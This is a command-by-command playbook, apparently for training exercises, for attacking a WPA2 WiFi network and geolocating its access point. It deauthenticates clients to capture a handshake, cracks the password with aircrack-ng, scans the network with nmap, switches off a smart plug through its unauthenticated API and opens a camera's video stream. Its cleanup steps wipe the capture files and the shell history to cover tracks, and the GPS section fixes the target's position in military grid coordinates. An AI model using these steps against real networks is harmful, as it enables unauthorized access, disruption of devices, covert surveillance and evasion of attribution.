================================================================
EXERCISE 1 — WIFI EXPLOITATION
================================================================

--- Prepare Interface ---
Confirm Alfa adapter is visible:
  iwconfig

Randomize MAC (OPSEC — prevents Alfa OUI from appearing in AP logs):
  sudo macchanger -r wlan1
  Ref: https://github.com/alobbs/macchanger

Kill interfering processes, then enable monitor mode:
  airmon-ng check kill
  airmon-ng start wlan1
  iwconfig    <- confirm wlan1mon is listed
  Ref: https://www.aircrack-ng.org/doku.php?id=airmon-ng

--- Scan and Target ---
Initial scan (all channels — record BSSID and channel of target):
  airodump-ng wlan1mon
  Output columns: BSSID | PWR (dBm) | CH | ENC | CIPHER | AUTH | ESSID
  Example: <TARGET_BSSID>  -46  ch <CHANNEL>  WPA2 CCMP PSK  <TARGET_SSID>
  Ref: https://www.aircrack-ng.org/doku.php?id=airodump-ng

Lock to target channel and BSSID (prevents channel hopping, filters noise):
  airodump-ng wlan1mon -c <CHANNEL> --bssid <TARGET_BSSID>

--- Capture Handshake ---
Start capture to file (COLLECTION terminal):
  airodump-ng wlan1mon -c <CHANNEL> --bssid <TARGET_BSSID> --write <CAPTURE_FILE>
  Note: writes <CAPTURE_FILE>-01.cap — contains the WPA2 4-way EAPOL handshake
  Ref: https://www.aircrack-ng.org/doku.php?id=cracking_wpa

Force handshake by deauthenticating clients (COMMAND terminal):
  aireplay-ng --deauth 100 -a <TARGET_BSSID> wlan1mon
  Note: 802.11 deauth frames are unauthenticated by design — no credentials needed to send
  Confirm: collection window shows [ WPA handshake: <TARGET_BSSID> ] in top-right corner
  Ref: https://www.aircrack-ng.org/doku.php?id=aireplay-ng

--- Crack Password ---
Run dictionary attack against captured handshake:
  aircrack-ng <CAPTURE_FILE>-01.cap -w /usr/share/wordlists/rockyou.txt
  Note: if rockyou.txt is missing, run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  Note: offline operation — tests PBKDF2/HMAC-SHA1 for each candidate word
  Result: KEY FOUND! [ <PASSWORD> ]
  GPU alternative: hashcat mode 22000 — significantly faster
  Ref: https://www.aircrack-ng.org/doku.php?id=aircrack-ng
  Ref: https://hashcat.net/wiki/doku.php?id=hashcat

--- Authenticate and Enumerate ---
Disable built-in NIC (never connect target network through it — attribution risk):
  sudo ip link set wlan0 down
Connect Alfa to target network using cracked password.
If Alfa is still in monitor mode, unplug and replug to reset to managed mode.
  ip addr show wlan1    <- confirm DHCP lease on wlan1 (e.g. <YOUR_IP>)

ICMP ping sweep (fast, may miss hosts with ICMP blocked):
  for i in {1..254}; do ping -c 1 <SUBNET_PREFIX>.$i | grep "from"; done

nmap sweep (ARP-based, finds hosts that block ICMP):
  nmap -sP <SUBNET>/24 -oA pingsweep
  Expected: <GATEWAY_IP> (router), <PLUG_IP> (TP-Link), <CAMERA_IP> (camera)
  Ref: https://nmap.org/book/man-host-discovery.html

Service scan each host:
  nmap -Pn -n -sT -sV <GATEWAY_IP>  -oA scan_router    <- ports 53, 80
  nmap -Pn -n -sT -sV <PLUG_IP>     -oA scan_tplink    <- port 9999 (Kasa protocol)
  nmap -Pn -n -sT -sV <CAMERA_IP>   -oA scan_camera    <- ports 80, 443, 554 (RTSP), 49152 (UPnP)
  Ref: https://nmap.org/book/man-port-scanning-techniques.html

--- Execute Effects ---
TP-Link smart plug — unauthenticated JSON API on port 9999:
  python3 tplink_smartplug.py -t <PLUG_IP> -c info    <- verify target device
  python3 tplink_smartplug.py -t <PLUG_IP> -c off     <- cut power
  python3 tplink_smartplug.py -t <PLUG_IP> -c on      <- restore power
  Ref: https://github.com/softScheck/tplink-smartplug
  Protocol ref: https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/

D-Link camera — RTSP stream on port 554:
  Browser: http://<CAMERA_IP>  -> Status page -> confirm correct camera -> screenshot
  VLC stream: vlc rtsp://<CAMERA_IP>/
  Ref: https://datatracker.ietf.org/doc/html/rfc2326

--- Clean Up ---
  rm <CAPTURE_FILE>-01.cap pingsweep.* scan_router.* scan_tplink.* scan_camera.*
  echo -n > ~/.zsh_history && exec zsh
  Settings Manager -> Advanced Network Configurations -> remove target WiFi network


================================================================
EXERCISE 2 — GPS GEOLOCATION WITH KISMET
================================================================

--- Verify Hardware ---
Re-enable monitor mode (required after Exercise 1 cleanup):
  airmon-ng start wlan1
  iwconfig    <- confirm wlan1mon is listed

Start gpsd (required before cgps will show data):
  sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
  Note: if gpsd is already running this will error — that's fine, proceed

Confirm GPS receiver and signal:
  ls /dev/ttyUSB0          <- if missing, check dmesg | tail for alternate path
  cgps -s                  <- wait for 3D FIX (>=4 satellites) before collecting
  airodump-ng wlan1mon     <- confirm target BSSID is still in range
  Ref: https://gpsd.gitlab.io/gpsd/

--- Run Kismet ---
Start Kismet (passive — transmits no frames, undetectable):
  sudo kismet
  Right-click http://localhost:2501 in terminal to open web UI
  Ref: https://www.kismetwireless.net/docs/readme/quickstart/
  GPS ref: https://www.kismetwireless.net/docs/readme/gps/

Configure in web UI:
  Hamburger menu (top left) -> Enable Datasource -> wlan1mon -> All Channels
  Confirm GPS coordinate values are updating in top-right
  Wait until target BSSID appears in Devices tab
  Ctrl+C to stop (graceful shutdown required — flush writes to .kismet SQLite DB)
  Note: killing the process without Ctrl+C can corrupt the .kismet file
  Ref: https://www.kismetwireless.net/docs/readme/datasources/

--- Convert and Visualize ---
Convert .kismet database to KML:
  sudo kismetdb_to_kml --in Kismet-<TIMESTAMP>.kismet --out OUTPUT.kml
  Note: filename format is Kismet-YYYYMMDD-HH-MM-SS-N.kismet
  Ref: https://www.kismetwireless.net/docs/readme/kismetdb/kismetdb_to_kml/
  KML ref: https://developers.google.com/kml/documentation/kmlreference

Open in Google Earth:
  File -> Open -> All Files -> select OUTPUT.kml
  Search for <TARGET_BSSID> in left panel
  Right-click placemark -> Properties -> change symbol -> Save
  Record coordinates:
    Lat/Long  : visible under Properties
    MGRS      : Tools (top banner) -> Military Grid System -> Properties
  Note: MGRS format example — 38SMB4611052890 (zone / 100km square / easting / northing)
  MGRS ref: https://www.nga.mil/ProductsServices/GeodesyandGeophysics/GeodeticTranslator.html

--- Clean Up ---
  rm *.kismet OUTPUT.kml
  echo -n > ~/.zsh_history && exec zsh
  Settings Manager -> Advanced Network Configurations -> remove target WiFi network
